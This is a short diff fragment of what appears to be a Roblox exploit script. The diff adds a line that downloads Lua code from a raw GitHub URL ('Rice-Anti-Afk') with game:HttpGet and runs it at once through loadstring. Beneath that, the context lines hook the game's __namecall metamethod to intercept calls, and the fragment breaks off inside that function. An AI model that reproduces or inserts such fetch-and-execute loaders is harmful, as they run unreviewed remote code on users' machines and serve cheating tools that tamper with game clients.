@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
 if hookmetamethod and typeof(hookmetamethod) == 'function' then
 	local oldHook
 	oldHook = hookmetamethod(game, "__namecall", function(self, ...)
